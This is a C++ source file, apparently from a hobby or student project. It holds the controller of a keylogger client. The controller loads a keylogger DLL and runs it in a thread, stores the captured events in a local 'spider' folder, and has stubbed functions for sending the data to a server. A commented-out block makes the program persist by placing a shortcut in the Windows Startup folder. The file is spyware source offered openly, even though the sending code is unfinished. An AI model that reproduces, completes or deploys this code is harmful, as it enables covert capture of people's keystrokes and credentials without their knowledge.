#include <iostream>
#include "client.h"
#include "sayHello.h"
#include "IInfoClient.h"

/////////////////////////////////////////////////////////////////
//  SETTINGS
/////////////////////////////////////////////////////////////////

clientController::clientController(void) throw(DLibraryException)
{

	//////////////////////////////////////////////////////
	// Specify libraries PATH
	//////////////////////////////////////////////////////

	this->libraries.add(1, "sayHello", "sayHello.dll");
	this->libraries.add(2, "workQueueManager", "workQueueManager.dll");
	this->libraries.add(3, "infoClient", "InfoClient.dll");
	this->libraries.add(4, "keylogger_dll", "keylogger_dll.dll");
	this->libraries.add(5, "dataHandler", "dataHandler.dll");

	this->quit = false;
	this->bytePerFile = 4;
	this->storeFolder = "C:\\\\spider\\";


	//////////////////////////////////////////////////////
	// Load Libraries
	//////////////////////////////////////////////////////

	std::string		err;

	if (!(this->libraries.handler.loadAll(err)))
		throw DLibraryException(err.c_str(), "Couldn't load module.");


	//////////////////////////////////////////////////////
	// Get dictionaries and instanciate tools
	//////////////////////////////////////////////////////

	// Say Hello
	if (!(this->dictSayHello = this->libraries.handler.getDictionaryByName("sayHello")))
		throw DLibraryException("sayHello", "Couldn't get Dictionary.");

	// Work Queue Manager
	if (!(this->dictWorkQueueManager = this->libraries.handler.getDictionaryByName("workQueueManager")))
		throw DLibraryException("workQueueManager", "Couldn't load thread module");
	this->eventQueue = ((_getAWorkQueue)(*this->dictWorkQueueManager)["getAWorkQueue"])();

	// Info Client
	if (!(this->dictInfoClient = this->libraries.handler.getDictionaryByName("infoClient")))
		throw DLibraryException("infoClient", "Couldn't get ClassInstance");
	this->infoClient = ((_getInstance)(*this->dictInfoClient)["getInstance"])();

	// KeyLogger
	if (!(this->dictKeyLogger = this->libraries.handler.getDictionaryByName("keylogger_dll")))
		throw DLibraryException("keylogger_dll", "Couldn't get Dictionary.");

	// DataHandler
	if (!(this->dictDataHandler = this->libraries.handler.getDictionaryByName("dataHandler")))
		throw DLibraryException("dataHandler", "Couldn't get Dictionary.");
	this->dataHandler = ((_getDataHandler)(*this->dictDataHandler)["getDataHandler"])();
	this->dataHandler->fileHandler->initStream(this->storeFolder, this->bytePerFile);
}

clientController::~clientController(void)
{
	this->libraries.handler.closeList();
}


/////////////////////////////////////////////////////////////////
//  CONDUCTOR ( mainAction )
/////////////////////////////////////////////////////////////////

int				clientController::mainAction(int ac, char **av)
{
	std::string	serialized;
	std::thread	threadKeyLogging(&clientController::keyLoggerThread, this);

	while (!this->quit)
	{
		this->sendLocalDataAction();
		serialized = this->serializeQueueAction();
		if (!this->sendPacketAction(new Packet(0, 101, true, serialized.size(), "serialized.c_str()")))
			this->storeEventAction(serialized);
	}

	threadKeyLogging.detach();
	return (0);
}


/////////////////////////////////////////////////////////////////
//  THREADED ACTIONS
/////////////////////////////////////////////////////////////////

void	clientController::keyLoggerThread(void)
{
	this->keyLogger = ((_instantiate)(*this->dictKeyLogger)["instantiate"])(this->eventQueue);
	this->keyLogger->init();
	this->keyLogger->run();
}


/////////////////////////////////////////////////////////////////
//  ITERATIVE ACTIONS
/////////////////////////////////////////////////////////////////

bool			clientController::sendLocalDataAction(void)
{
	std::string	buffer;

	std::cout << "Send local data" << std::endl;
	buffer = this->dataHandler->fileHandler->extractDataFromStream(10);
	while (buffer.size())
	{
		// SEND BUFFER TO SERVER HERE ...
		// VERIFY BEFORE ERASING !
		this->dataHandler->fileHandler->removeLocalData(10);
		buffer = this->dataHandler->fileHandler->extractDataFromStream(10);
	}
	return (true);
}

std::string	clientController::serializeQueueAction(void)
{
	// TO-DO
	std::cout << "serialize event ..." << std::endl;
	return (std::string(""));
}

bool		clientController::sendPacketAction(Packet *packet)
{
	// TO-DO
	std::cout << "send packet ..." << std::endl;
	return (true);
}

bool		clientController::storeEventAction(std::string serialized)
{
	this->dataHandler->fileHandler->insertDataToStream(serialized);
	return (true);
}





/*

	--> A Quoi Sert Ce Code ?

void	clientController::defineShortcut(void) {
	LPCSTR module = new char[MAX_PATH];
	if (GetModuleFileName(NULL, (LPSTR)module, MAX_PATH) != 0) {
		PWSTR pszpath;
		if (SHGetKnownFolderPath(FOLDERID_Startup, 0, NULL, &pszpath) == S_OK) {
			std::wstring shortcut_path(pszpath);
			shortcut_path += SHORTCUT_NAME;
			CoTaskMemFree(pszpath);
			if (PathFileExistsW((LPWSTR)shortcut_path.c_str()) == false)
				createShortcut(module, shortcut_path.c_str(), DESCR);
			return;
		}
	}
}

bool clientController::createShortcut(LPCSTR lpszPathObj, LPCWSTR lpszPathLink, LPCSTR descr) {
	HRESULT hres;
	IShellLink* psl;

	CoInitializeEx(NULL, COINIT_MULTITHREADED);
	hres = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (LPVOID*)&psl);
	if (SUCCEEDED(hres)) {
		IPersistFile* ppf;
		psl->SetPath(lpszPathObj);
		psl->SetDescription(descr);

		hres = psl->QueryInterface(IID_IPersistFile, (LPVOID*)&ppf);
		if (SUCCEEDED(hres)) {
			hres = ppf->Save(lpszPathLink, TRUE);
			ppf->Release();
		}
		psl->Release();
	}
	return SUCCEEDED(hres);
}
*/